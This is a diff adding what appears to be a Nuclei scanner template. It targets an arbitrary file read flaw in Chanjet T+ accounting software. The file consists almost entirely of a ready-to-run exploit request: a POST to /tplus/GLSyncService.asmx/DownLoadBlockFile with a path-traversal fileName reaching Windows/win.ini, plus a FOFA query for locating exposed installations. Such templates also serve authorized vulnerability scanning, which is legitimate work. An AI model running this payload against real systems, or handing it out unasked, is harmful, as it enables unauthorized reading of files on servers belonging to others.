@@ -1,0 +1,32 @@
+id: poc-mh5mf40gvmy45bhs
+info:
+  name: 畅捷通T+ DownLoadBlockFile 存在任意文件读取漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/mh5mf40gvmy45bhs'
+  tags: lfi,2026
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: mh5mf40gvmy45bhs
+    fofa: app="畅捷通-TPlus"
+http:
+- raw:
+  - 'POST /tplus/GLSyncService.asmx/DownLoadBlockFile HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Accept-Encoding: gzip
+
+    Connection: keep-alive
+
+    Content-Type: application/x-www-form-urlencoded
+
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/865.3 Safari/537.36
+
+
+    fileName=..%2F..%2F..%2FWindows%2Fwin.ini'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
